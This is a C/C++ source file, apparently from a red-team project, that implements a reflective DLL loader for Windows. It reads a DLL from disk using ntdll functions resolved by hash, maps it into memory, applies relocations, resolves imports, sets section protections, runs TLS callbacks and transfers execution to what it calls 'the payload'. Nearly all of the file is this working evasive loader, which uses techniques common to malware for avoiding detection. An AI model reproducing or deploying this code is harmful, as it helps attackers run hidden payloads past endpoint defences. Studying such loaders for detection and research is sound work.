#include "src/h/defs.h"
#include "src/h/peb.h"

void *mc(void *dest, const void *src, size_t n) {

  char *d = (char *)dest;
  const char *s = (const char *)src;
  while (n--)
    *d++ = *s++;
  return dest;
}

extern "C" {
void __main() {}

void *memset(void *s, int c, size_t n) {
  unsigned char *cursor = (unsigned char *)s;
  while (n--)
    *cursor++ = (unsigned char)c;
  return s;
}

size_t strlen(const char *s) {
  size_t len = 0;
  while (*s++)
    len++;
  return len;
}
}
extern "C" void entry() {

  ////////////////////////////////////////////////////////////////////////////
  // 1. Disk staging & buffer ingestion
  ////////////////////////////////////////////////////////////////////////////
  NTSTATUS nt_status;
  UNICODE_STRING dll_file;
  // WCHAR w_file_path[100] = L"main.dll";
  // WCHAR w_file_path[] = L"\\??\\C:\\windows\\temp\\test.txt";
  WCHAR w_file_path[] = L"\\??\\Z:\\home\\nabiasa\\Desktop\\Nyx\\rdi_srdi\\main.dll";
  // Resolve and invoke RtlInitUnicodeString
  void *p_ntdll = get_ntdll();
  void *p_rtl_init_unicode_string =
      get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
  RtlInitUnicodeString *pfn_rtl_init_unicode_string =
      (RtlInitUnicodeString *)p_rtl_init_unicode_string;
  pfn_rtl_init_unicode_string(&dll_file, w_file_path);

  FILE_STANDARD_INFORMATION file_standard_info;
  OBJECT_ATTRIBUTES obj_attrs;
  IO_STATUS_BLOCK io_status_block;
  InitializeObjectAttributes(&obj_attrs, &dll_file, OBJ_CASE_INSENSITIVE, NULL,
                             NULL);
  // Resolve and invoke NtCreateFile
  HANDLE h_file = NULL;
  void *p_nt_create_file =
      get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
  NtCreateFile *pfn_nt_create_file = (NtCreateFile *)p_nt_create_file;

  // Vérifie que pfn_nt_create_file est valide
  if (!pfn_nt_create_file) {
    // LoggInfo("pfn_nt_create_file is NULL!");
    EXIT(-1);
  }
  // LoggInfo("2 - pfn_nt_create_file is valid");

  // Appelle NtCreateFile
  nt_status = pfn_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs,
                            &io_status_block, NULL, 0x0000080, 0x0000007,
                            FILE_OPEN_IF, 0x0000020, 0x0000000, 0);

  // LoggInfo("3 - NtCreateFile called"); // ← Maintenant TOUJOURS atteint !
  if (nt_status != 0) {
    char error_buffer[128];
    char *cursor = error_buffer;

    const char *error_prefix = "[ERROR ] NtCreateFile nt_status = 0x";
    while (*error_prefix)
      *cursor++ = *error_prefix++;

    // Status en hex (8 digits)
    for (int i = 7; i >= 0; i--) {
      int nibble = (nt_status >> (i * 4)) & 0xF;
      *cursor++ = (nibble < 10) ? ('0' + nibble) : ('A' + nibble - 10);
    }
    *cursor++ = '\n';
    *cursor = '\0';

    // LoggInfo(error_buffer);
    EXIT(-1);
  }
  // LoggInfo("4 - NtCreateFile SUCCESS");

  // Resolve and invoke NtQueryInformationFile
  void *p_nt_query_information_file =
      get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);
  NtQueryInformationFile *pfn_nt_query_information_file =
      (NtQueryInformationFile *)p_nt_query_information_file;
  if ((nt_status = pfn_nt_query_information_file(h_file, &io_status_block,
                                            &file_standard_info,
                                            sizeof(FILE_STANDARD_INFORMATION),
                                            FileStandardInformation)) != 0x0) {
    EXIT(-2);
  }
  // Resolve and invoke NtAllocateVirtualMemory
  unsigned long long int dll_size = file_standard_info.EndOfFile.QuadPart;
  void *dll_bytes = NULL;
  void *p_nt_allocate_virtual_memory =
      get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
  NtAllocateVirtualMemory *pfn_nt_allocate_virtual_memory =
      (NtAllocateVirtualMemory *)p_nt_allocate_virtual_memory;
  if ((nt_status =
           pfn_nt_allocate_virtual_memory(((HANDLE)-1), &dll_bytes, 0, &dll_size,
                                        MEM_COMMIT, PAGE_READWRITE)) != 0x0)
    EXIT(-3);
  // Resolve and invoke NtReadFile
  void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);
  NtReadFile *pfn_nt_read_file = (NtReadFile *)p_nt_read_file;
  if ((nt_status = pfn_nt_read_file(h_file, NULL, NULL, NULL, &io_status_block,
                               dll_bytes, dll_size, 0, NULL)) != 0x0)
    EXIT(-4);
  ////////////////////////////////////////////////////////////////////////////
  // 2. Parse PE headers and validate structure
  ////////////////////////////////////////////////////////////////////////////
  PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
  PIMAGE_NT_HEADERS p_nt_headers =
      (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes +
                          p_dos_header->e_lfanew);
  SIZE_T dll_image_size = p_nt_headers->OptionalHeader.SizeOfImage;

  ////////////////////////////////////////////////////////////////////////////
  // 3. Allocate image memory
  ////////////////////////////////////////////////////////////////////////////
  // Allocate memory using NTAPI
  void *dll_base = NULL;
  if ((nt_status = pfn_nt_allocate_virtual_memory(((HANDLE)-1), &dll_base, 0,
                                             &dll_image_size, MEM_COMMIT,
                                             PAGE_READWRITE)) != 0x0)
    EXIT(-4);

  // Calculate relocation delta
  unsigned long long int delta_image_base =
      (unsigned long long int)dll_base -
      (unsigned long long int)p_nt_headers->OptionalHeader.ImageBase;
  // Map PE Headers
  mc(dll_base, dll_bytes, p_nt_headers->OptionalHeader.SizeOfHeaders);
  // Map Sections
  PIMAGE_SECTION_HEADER p_section = IMAGE_FIRST_SECTION(p_nt_headers);
  for (size_t i = 0; i < p_nt_headers->FileHeader.NumberOfSections; i++) {

    void *section_destination =
        (LPVOID)((unsigned long long int)dll_base +
                 (unsigned long long int)p_section->VirtualAddress);
    void *section_bytes =
        (LPVOID)((unsigned long long int)dll_bytes +
                 (unsigned long long int)p_section->PointerToRawData);
    // ... [Custom memory copy implementation]
    mc(section_destination, section_bytes, p_section->SizeOfRawData);
    p_section++;
  }
  ////////////////////////////////////////////////////////////////////////////
  // 4. Apply reloc_dir
  ////////////////////////////////////////////////////////////////////////////
  _IMAGE_DATA_DIRECTORY reloc_dir =
      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
  unsigned long long int relocation_table =
      reloc_dir.VirtualAddress + (unsigned long long int)dll_base;
  unsigned long cb_relocations_processed = 0;

  while (cb_relocations_processed < reloc_dir.Size) {
    PBASE_RELOCATION_BLOCK p_relocation_block =
        (PBASE_RELOCATION_BLOCK)(relocation_table + cb_relocations_processed);
    cb_relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
    unsigned long cb_relocations_count =
        (p_relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
        sizeof(BASE_RELOCATION_ENTRY);
    PBASE_RELOCATION_ENTRY p_relocation_entries =
        (PBASE_RELOCATION_ENTRY)(relocation_table + cb_relocations_processed);

    for (unsigned long i = 0; i < cb_relocations_count; i++) {
      cb_relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
      if (p_relocation_entries[i].Type == 0)
        continue;

      unsigned long long int rva_relocation =
          p_relocation_block->PageAddress + p_relocation_entries[i].Offset;
      unsigned long long int patch_value = 0;
      void *p_nt_read_virtual_memory =
          get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
      // Resolve NtReadVirtualMemory
      NtReadVirtualMemory *pfn_nt_read_virtual_memory =
          (NtReadVirtualMemory *)p_nt_read_virtual_memory;
      // Read the value to patch via NTAPI instead of direct dereference
      if ((nt_status = pfn_nt_read_virtual_memory(
               ((HANDLE)-1),
               (void *)((unsigned long long int)dll_base + rva_relocation),
               &patch_value, sizeof(unsigned long long int), NULL)) != 0x0)
        EXIT(-5);
      // Apply delta to local variable
      patch_value += delta_image_base;
      mc((void *)((unsigned long long int)dll_base + rva_relocation),
         &patch_value, sizeof(unsigned long long int));
    }
  }
  ////////////////////////////////////////////////////////////////////////////
  // 5. Resolve imports via NTAPI
  ////////////////////////////////////////////////////////////////////////////
  PIMAGE_IMPORT_DESCRIPTOR p_import_descriptor;
  IMAGE_DATA_DIRECTORY import_directory =
      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
  UNICODE_STRING import_library_name;

  p_import_descriptor =
      (PIMAGE_IMPORT_DESCRIPTOR)(import_directory.VirtualAddress +
                                 (unsigned long long int)dll_base);
  void *h_library = NULL;

  // Iterate through all DLL dependencies in the Import Directory
  while (p_import_descriptor->Name != 0) {
    void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
    char *p_module_name = (char *)dll_base + p_import_descriptor->Name;
    wchar_t w_module_name[MAX_PATH];
    unsigned long cb_converted;

    // Convert ANSI to Unicode using NTAPI
    void *p_rtl_multi_byte_to_unicode_n =
        get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
    RtlMultiByteToUnicodeN *pfn_rtl_multi_byte_to_unicode_n =
        (RtlMultiByteToUnicodeN *)p_rtl_multi_byte_to_unicode_n;
    //  strlen to avoid CRT imports
    if ((nt_status = pfn_rtl_multi_byte_to_unicode_n(
             w_module_name, sizeof(w_module_name), &cb_converted, p_module_name,
             strlen(p_module_name) + 1)) != 0x0)
      EXIT(-5);
    // Load the DLL via NTAPI
    pfn_rtl_init_unicode_string(&import_library_name, w_module_name);
    LdrLoadDll *pfn_ldr_load_dll = (LdrLoadDll *)p_ldr_load_dll;
    if ((nt_status = pfn_ldr_load_dll(NULL, NULL, &import_library_name,
                                 &h_library)) != 0x0)
      EXIT(-6);

    if (h_library) {
      ANSI_STRING ansi_string;
      PIMAGE_THUNK_DATA p_thunk = NULL;
      PIMAGE_THUNK_DATA p_original_thunk = NULL;
      p_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base +
                                  p_import_descriptor->FirstThunk);
      p_original_thunk =
          (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base +
                              p_import_descriptor->OriginalFirstThunk);
      // Resolve individual functions
      while (p_thunk->u1.AddressOfData != 0) {
        void *p_ldr_get_procedure_address =
            get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
        LdrGetProcedureAddress *pfn_ldr_get_procedure_address =
            (LdrGetProcedureAddress *)p_ldr_get_procedure_address;
        if (IMAGE_SNAP_BY_ORDINAL(p_thunk->u1.Ordinal)) {
          pfn_ldr_get_procedure_address(h_library, NULL,
                                      (WORD)p_original_thunk->u1.Ordinal,
                                      (PVOID *)&(p_thunk->u1.Function));
        } else {
          PIMAGE_IMPORT_BY_NAME p_function_name =
              (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base +
                                      p_thunk->u1.AddressOfData);
          FILL_STRING(ansi_string, p_function_name->Name);
          pfn_ldr_get_procedure_address(h_library, &ansi_string, 0,
                                      (PVOID *)&(p_thunk->u1.Function));
        }
        ++p_thunk;
        ++p_original_thunk;
      }
    }
    p_import_descriptor++;
  }
  ////////////////////////////////////////////////////////////////////////////
  // 6. Set per-p_section memory protections
  ////////////////////////////////////////////////////////////////////////////
  PIMAGE_SECTION_HEADER p_section_header = IMAGE_FIRST_SECTION(p_nt_headers);

  for (int i = 0; i < p_nt_headers->FileHeader.NumberOfSections;
       i++, p_section_header++) {
    if (p_section_header->SizeOfRawData) {
      // Extract Boolean flags from p_section characteristics
      unsigned long is_executable =
          (p_section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
      unsigned long is_readable =
          (p_section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
      unsigned long is_writeable =
          (p_section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
      unsigned long page_protect = 0;
      // Translate 3-bit PE flags to NTAPI memory protection constants
      if (!is_executable && !is_readable && !is_writeable)
        page_protect = PAGE_NOACCESS;
      else if (!is_executable && !is_readable && is_writeable)
        page_protect = PAGE_WRITECOPY;
      else if (!is_executable && is_readable && !is_writeable)
        page_protect = PAGE_READONLY;
      else if (!is_executable && is_readable && is_writeable)
        page_protect = PAGE_READWRITE;
      else if (is_executable && !is_readable && !is_writeable)
        page_protect = PAGE_EXECUTE;
      else if (is_executable && !is_readable && is_writeable)
        page_protect = PAGE_EXECUTE_WRITECOPY;
      else if (is_executable && is_readable && !is_writeable)
        page_protect = PAGE_EXECUTE_READ;
      else if (is_executable && is_readable && is_writeable)
        page_protect = PAGE_EXECUTE_READWRITE;
      // Handle optional PE cache flags
      if (p_section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
        page_protect |= PAGE_NOCACHE;
      // Resolve and invoke NtProtectVirtualMemory
      void *p_nt_protect_virtual_memory =
          get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
      NtProtectVirtualMemory *pfn_nt_protect_virtual_memory =
          (NtProtectVirtualMemory *)p_nt_protect_virtual_memory;
      size_t cb_size = p_section_header->Misc.VirtualSize;
      void *p_address =
          reinterpret_cast<PBYTE>(dll_base) + p_section_header->VirtualAddress;

      unsigned long old_protect = 0;
      // NtProtectVirtualMemory updates 'p_address' and 'cb_size' to reflect
      // page-aligned boundaries
      if ((nt_status =
               pfn_nt_protect_virtual_memory(NtCurrentProcess(), &p_address, &cb_size,
                                           page_protect, &old_protect)) != 0x0)
        EXIT(-7);
    }
  }
  ////////////////////////////////////////////////////////////////////////////
  // 7. Flush instruction cache and run TLS callbacks
  ////////////////////////////////////////////////////////////////////////////
  void *p_nt_flush_instruction_cache =
      get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
  NtFlushInstructionCache *pfn_nt_flush_instruction_cache =
      (NtFlushInstructionCache *)p_nt_flush_instruction_cache;
  pfn_nt_flush_instruction_cache((HANDLE)-1, NULL, 0);

  PIMAGE_TLS_CALLBACK *p_tls_callback;
  PIMAGE_DATA_DIRECTORY tls_directory_entry =
      &p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
  if (tls_directory_entry->Size) {
    PIMAGE_TLS_DIRECTORY p_tls_directory =
        (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base +
                               tls_directory_entry->VirtualAddress);
    p_tls_callback = (PIMAGE_TLS_CALLBACK *)(p_tls_directory->AddressOfCallBacks);
    for (; *p_tls_callback; p_tls_callback++)
      (*p_tls_callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
  }
  ////////////////////////////////////////////////////////////////////////////
  // 8. Resolve entry point and transfer control
  ////////////////////////////////////////////////////////////////////////////
  DLLEntry p_dll_entry =
      (DLLEntry)((unsigned long long int)dll_base +
                 p_nt_headers->OptionalHeader.AddressOfEntryPoint);

  // Transfer execution to the payload
  (*p_dll_entry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

  // Post-execution cleanup (Reached only if DllMain returns)
  void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
  NtClose *pfn_nt_close = (NtClose *)p_nt_close;
  pfn_nt_close(h_file);

  // Eradicate the raw staging buffer
  void *p_nt_free_virtual_memory =
      get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
  NtFreeVirtualMemory *pfn_nt_free_virtual_memory =
      (NtFreeVirtualMemory *)p_nt_free_virtual_memory;
  pfn_nt_free_virtual_memory(((HANDLE)-1), &dll_bytes, &dll_size, MEM_RELEASE);
  EXIT(-1);
}
